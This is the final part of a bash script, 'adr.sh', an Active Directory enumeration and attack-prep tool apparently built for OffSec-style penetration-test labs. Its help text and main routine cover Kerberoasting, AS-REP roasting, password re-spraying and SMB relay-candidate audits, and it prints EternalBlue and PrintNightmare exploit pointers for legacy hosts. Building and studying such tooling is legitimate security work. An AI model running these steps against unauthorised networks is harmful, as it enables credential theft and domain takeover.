                os_host=$(echo "${os_line}" | awk '{print $1}')
                os_ver=$(echo "${os_line}" | tr '[:upper:]' '[:lower:]')
                case "${os_ver}" in
                    *"windows 7"*|*"2008"*|*"xp"*|*"vista"*)
                        echo "  ${os_host}: MS17-010 (EternalBlue) — detect: nxc smb ${os_host} -M ms17-010"
                        echo "    Exploit (OffSec: MSF limit = 1 target across engagement): msf: use exploit/windows/smb/ms17_010_eternalblue"
                        echo "    Manual (no MSF): use worawit/MS17-010 PoC (checker.py → eternalblue_exploit7.py / zzz_exploit.py)" ;;
                    *"2012"*|*"windows 8"*)
                        echo "  ${os_host}: Check MS17-010, PrintNightmare, EternalBlue"
                        echo "    nxc smb ${os_host} -M ms17-010" ;;
                    *"2019"*|*"windows 10"*)
                        echo "  ${os_host}: PrintNightmare (CVE-2021-1675)"
                        echo "    impacket-rpcdump ${os_host} | grep -i 'print'" ;;
                    *)
                        echo "  ${os_host}: check searchsploit / nxc modules for this OS version" ;;
                esac
            done < <(cat "${OUTDIR}/computers/old_os.txt" 2>/dev/null | head -10)
        else
            echo "  None identified"
        fi
        echo ""

        echo "BLOODHOUND"
        if [[ "$SKIP_BLOODHOUND" == true ]]; then
            echo "  Collection: SKIPPED (--skip-bloodhound)"
        elif [[ -n "$bh_zip" ]]; then
            echo "  Collection: SUCCESS"
            echo "  Zip:  ${bh_zip}"
            echo "  Next: upload to BloodHound CE → Shortest Path from Owned Principals"
        else
            echo "  Collection: failed or not run"
            echo "  Check: ${OUTDIR}/bloodhound/collection_output.txt"
        fi
        echo ""

        echo "NEXT STEPS"
        echo "  Fully resolved copy-paste commands: ${OUTDIR}/next_steps.txt"
        echo "  Legacy alias: ${OUTDIR}/attack_commands.txt"
        echo ""
        echo "════════════════════════════════════════════════════════════════"
    } > "$summary"

    success "Summary → ${summary}"
    echo ""
    cat "$summary"
}

#==============================================================================
# HELP
#==============================================================================
show_help() {
    cat <<'EOF'

adr.sh — Active Directory Enumeration and Attack-Prep Script
OffSec-focused. Enumeration only. Runs on Kali against a target DC.

USAGE:
  ./adr.sh -d DOMAIN -u USER -p PASSWORD -dc DC_IP [OPTIONS]
  ./adr.sh -d DOMAIN -u USER -H :NTLMHASH -dc DC_IP [OPTIONS]

REQUIRED:
  -d, --domain DOMAIN       Domain name (e.g. corp.local)
  -u, --user   USER         Domain username
  -dc, --dc-ip IP           Domain controller IP

AUTHENTICATION (one required):
  -p, --password PASS       Plaintext password
  -H, --hash NTLM           NTLM hash — formats: :NTLMHASH or LMHASH:NTLMHASH
  -k, --kerberos            Kerberos auth — uses ccache in KRB5CCNAME env var
                            (no -p/-H needed; DC hostname recommended via --dc-host)

OPTIONS:
  --outdir DIR              Output directory (default: $TOOLKIT_ROOT/ad/<DOMAIN>/)
  --dc-host HOSTNAME        DC hostname (required for Kerberos; helps AS-REP/getST)
  --skip-bloodhound         Skip BloodHound collection
  --skip-shares             Skip share enumeration
  --chain                   Interactive AD kill chain walkthrough
  --quick                   Phases 1-3 only (fast sweep, skip slow phases)
  --force                   Re-run all phases (ignore completed progress.log)
  --threads N               nxc thread count (default: 10)
  --no-color                Disable ANSI colors
  -h, --help                This help

PHASES (default run, in order):
  Phase 1   Domain context, password policy, clock-skew vs DC, null-auth hints
  Phase 2   User enumeration + description mining (credentials in descriptions)
  Phase 2b  Targeted LDAP: LAPS, gMSA, delegation, trusts, adminCount, MAQ
  Phase 2c  ADCS enumeration (certipy-ad find -vulnerable — ESC1..ESC13 detect)
  Phase 3   Kerberoast + AS-REP roast (hash collection only, no auto-crack)
  Phase 4   Computer enumeration, legacy-OS detection (MS17-010 hints)
  Phase 5   SMB signing audit (relay candidate list)
  Phase 6   BloodHound collection (bloodhound-ce-python)
  Phase 7   Share enumeration (SYSVOL GPP, readable shares)
  Phase 8   Session enumeration (RID-level logged-on users)
  Phase 9   Re-spray cracked passwords (requires prior crackr.sh run)

EXAMPLES:
  ./adr.sh -d corp.local -u administrator -p Password1 -dc 10.10.10.5
  ./adr.sh -d corp.local -u jdoe -H :aad3b435b51404eeaad3b435b51404ee -dc 10.10.10.5
  export KRB5CCNAME=/tmp/jdoe.ccache
  ./adr.sh -d corp.local -u jdoe -k --dc-host DC01 -dc 10.10.10.5
  ./adr.sh -d corp.local -u jdoe -p Pass -dc 10.10.10.5 --quick
  ./adr.sh -d corp.local -u jdoe -p Pass -dc 10.10.10.5 --force --skip-bloodhound

OUTPUT STRUCTURE:
  ad/<DOMAIN>/
    users/         all_users.txt, asrep_candidates.txt, suspicious_descriptions.txt
    groups/        all_groups.txt, privileged_groups.txt
    computers/     all_computers.txt, old_os.txt
    hashes/        asreproast.txt, kerberoast.txt  ← feed directly to crackr.sh
    ldap/          laps.txt, gmsa.txt, delegation.txt, trusts.txt, admin_count.txt
    adcs/          certipy_find.txt
    bloodhound/    *.zip  ← upload to BloodHound CE
    shares/        all_shares.txt, sysvol contents
    sessions/      smb_sessions.txt, loggedon_users.txt
    summary.txt              READ THIS FIRST
    next_steps.txt           copy-paste next steps
    attack_commands.txt      legacy alias

HASH AUTH NOTES:
  - ldapsearch does not support NTLM hash auth — LDAP MAQ query skipped
  - rpcclient uses --pw-nt-hash with the NT portion
  - impacket tools use -hashes LMHASH:NTHASH format (auto-normalized)
  - nxc uses -H NTLMHASH (NT portion only, auto-normalized)

KERBEROS AUTH NOTES:
  - Requires KRB5CCNAME environment variable pointing to a valid ccache
  - Clock-skew tolerance is 300s — Phase 1 warns if exceeded (fix: ntpdate DC)
  - --dc-host is strongly recommended (Kerberos requires hostname, not IP)
  - Kerberos uses: nxc --use-kcache, impacket -k -no-pass, certipy-ad -k -no-pass

EOF
}

#==============================================================================
# MAIN
#==============================================================================
main() {
    if [[ $# -eq 0 ]]; then
        show_help
        exit 0
    fi

    local raw_hash=""

    while [[ $# -gt 0 ]]; do
        case "$1" in
            -d|--domain)
                [[ $# -lt 2 ]] && { error "--domain requires an argument"; exit 1; }
                DOMAIN="$2"; shift 2 ;;
            -u|--user)
                [[ $# -lt 2 ]] && { error "--user requires an argument"; exit 1; }
                AD_USER="$2"; shift 2 ;;
            -p|--password)
                [[ $# -lt 2 ]] && { error "--password requires an argument"; exit 1; }
                PASS="$2"; AUTH_TYPE="password"; shift 2 ;;
            -H|--hash)
                [[ $# -lt 2 ]] && { error "--hash requires an argument"; exit 1; }
                raw_hash="$2"; AUTH_TYPE="hash"; shift 2 ;;
            -dc|--dc-ip)
                [[ $# -lt 2 ]] && { error "--dc-ip requires an argument"; exit 1; }
                DC_IP="$2"; shift 2 ;;
            --dc-host)
                [[ $# -lt 2 ]] && { error "--dc-host requires an argument"; exit 1; }
                DC_HOST="$2"; shift 2 ;;
            --outdir)
                [[ $# -lt 2 ]] && { error "--outdir requires an argument"; exit 1; }
                OUTDIR="$2"; shift 2 ;;
            --threads)
                [[ $# -lt 2 ]] && { error "--threads requires an argument"; exit 1; }
                THREADS="$2"; shift 2 ;;
            --skip-bloodhound) SKIP_BLOODHOUND=true; shift ;;
            --skip-shares)     SKIP_SHARES=true; shift ;;
            --chain)           CHAIN_MODE=true; shift ;;
            --quick)           QUICK_MODE=true; shift ;;
            --force)           FORCE_MODE=true; shift ;;
            -k|--kerberos)
                KERBEROS=true
                [[ -z "$AUTH_TYPE" ]] && AUTH_TYPE="kerberos"
                shift ;;
            --no-color)        disable_colors; shift ;;
            -h|--help|help)    show_help; exit 0 ;;
            *)
                error "Unknown option: $1"
                show_help
                exit 1 ;;
        esac
    done

    # Validate required arguments
    [[ -z "$DOMAIN" ]]    && { error "-d/--domain is required"; exit 1; }
    [[ -z "$AD_USER" ]]      && { error "-u/--user is required"; exit 1; }
    [[ -z "$DC_IP" ]]     && { error "-dc/--dc-ip is required"; exit 1; }
    [[ -z "$AUTH_TYPE" ]] && { error "One of -p/--password, -H/--hash, or -k/--kerberos is required"; exit 1; }
    if [[ "$AUTH_TYPE" == "kerberos" && -z "${KRB5CCNAME:-}" ]]; then
        warn "KRB5CCNAME is not set — Kerberos auth will likely fail"
        warn "  export KRB5CCNAME=/path/to/ticket.ccache"
    fi
    is_valid_ip "$DC_IP"  || { error "Invalid DC IP: ${DC_IP}"; exit 1; }
    if ! is_positive_integer "$THREADS" || (( THREADS > 200 )); then
        error "Invalid thread count: ${THREADS} (must be 1-200)"
        exit 1
    fi

    # Normalize hash
    if [[ "$AUTH_TYPE" == "hash" ]]; then
        [[ -z "$raw_hash" ]] && { error "--hash value is empty"; exit 1; }
        normalize_hash "$raw_hash" || {
            error "Invalid hash format: ${raw_hash}"
            error "Expected :NTLMHASH, LMHASH:NTHASH, or plain 32-character NTHASH"
            exit 1
        }
    fi

    # Set defaults
    [[ -z "$OUTDIR" ]] && OUTDIR="${TOOLKIT_ROOT}/ad/${DOMAIN}"
    BASE_DN=$(domain_to_dn "$DOMAIN")

    # Create full output directory structure
    if ! mkdir -p -- \
        "${OUTDIR}/users" \
        "${OUTDIR}/groups" \
        "${OUTDIR}/computers" \
        "${OUTDIR}/hashes" \
        "${OUTDIR}/bloodhound" \
        "${OUTDIR}/shares" \
        "${OUTDIR}/sessions"; then
        error "Failed to create output directory tree: ${OUTDIR}"
        exit 1
    fi

    # Reset summary notes on --force
    if [[ "$FORCE_MODE" == true ]]; then
        : > "${OUTDIR}/summary_notes.txt"
        : > "${OUTDIR}/attack_commands.txt"
        : > "${OUTDIR}/next_steps.txt"
    fi
    touch "${OUTDIR}/summary_notes.txt"

    # Initialise attack commands file if not already present
    if [[ ! -f "${OUTDIR}/attack_commands.txt" ]]; then
        {
            echo "# AD Attack Commands — ${DOMAIN}"
            echo "# Generated by adr.sh on $(date)"
            echo "# REVIEW ALL COMMANDS BEFORE RUNNING"
            echo ""
        } > "${OUTDIR}/attack_commands.txt"
    fi
    sync_next_steps_file

    # Banner
    echo ""
    echo -e "${BOLD}${CYAN}════════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}${CYAN}  adr.sh — Active Directory Enumeration${NC}"
    echo -e "${BOLD}${CYAN}  Domain:  ${DOMAIN}${NC}"
    echo -e "${BOLD}${CYAN}  DC:      ${DC_IP}${NC}"
    echo -e "${BOLD}${CYAN}  User:    ${AD_USER} (${AUTH_TYPE} auth)${NC}"
    echo -e "${BOLD}${CYAN}  Base DN: ${BASE_DN}${NC}"
    echo -e "${BOLD}${CYAN}  Output:  ${OUTDIR}${NC}"
    [[ "$QUICK_MODE" == true ]] && \
        echo -e "${BOLD}${YELLOW}  Mode:    QUICK (phases 1-3 only)${NC}"
    echo -e "${BOLD}${CYAN}════════════════════════════════════════════════════════════${NC}"
    echo ""

    check_tools

    # Chain mode: interactive AD kill chain walkthrough
    if [[ "$CHAIN_MODE" == true ]]; then
        build_nxc_auth
        build_rpc_auth
        build_smbc_auth
        mode_chain
        sync_next_steps_file
        exit 0
    fi

    # Execute phases
    if ! phase1_domain_context; then
        error "Phase 1 failed — aborting (credential validation failed)"
        # Write a minimal abort summary instead of the full summary,
        # which would reference data that was never collected.
        {
            echo "════════════════════════════════════════════════════════════════"
            echo "  AD ENUMERATION — ABORTED"
            echo "  Generated: $(date)"
            echo "════════════════════════════════════════════════════════════════"
            echo ""
            echo "Phase 1 (credential validation) failed. No enumeration was run."
            echo ""
            echo "Target:    ${DC_IP}"
            echo "Domain:    ${DOMAIN}"
            echo "User:      ${AD_USER} (${AUTH_TYPE} auth)"
            echo "Output:    ${OUTDIR}/"
            echo ""
            echo "Check:  ${OUTDIR}/phase1_*.txt for the authentication error."
        } > "${OUTDIR}/summary.txt"
        exit 1
    fi

    phase2_user_enum
    phase2b_ldap_enum
    phase2c_adcs
    phase3_kerberos

    if [[ "$QUICK_MODE" == false ]]; then
        phase4_computers
        phase5_smb_signing
        phase6_bloodhound
        phase7_shares
        phase8_sessions
        phase9_spray_cracked
    fi

    generate_ad_2025_next_steps
    write_summary
    sync_next_steps_file

    echo ""
    success "Enumeration complete — ${OUTDIR}/"
    success "READ FIRST:   ${OUTDIR}/summary.txt"
    success "NEXT STEPS:   ${OUTDIR}/next_steps.txt"
    success "LEGACY ALIAS: ${OUTDIR}/attack_commands.txt"
}

if [[ "${OffSec_LIB_ONLY:-false}" == "true" ]]; then
    # shellcheck disable=SC2317
    return 0 2>/dev/null || exit 0
fi

main "$@"
